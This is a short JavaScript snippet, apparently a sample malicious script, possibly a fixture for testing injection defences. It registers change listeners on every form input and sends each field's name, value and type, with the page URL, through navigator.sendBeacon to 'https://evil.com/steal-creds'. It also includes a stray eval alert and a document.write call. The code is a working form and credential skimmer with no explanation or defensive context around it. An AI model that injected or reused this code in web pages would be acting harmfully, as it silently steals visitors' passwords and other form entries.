eval('alert("dis bad sucka")');

document.querySelectorAll('form input, input[form]').forEach(input => {
	input.addEventListener('change', ({target}) => {
		navigator.sendBeacon('https://evil.com/steal-creds', JSON.stringify({
			url: location.href,
			input: {
				name: target.name,
				value: target.value,
				type: target.type,
				form: target.form,
			}
		}));
	})
});

document.write('oops');
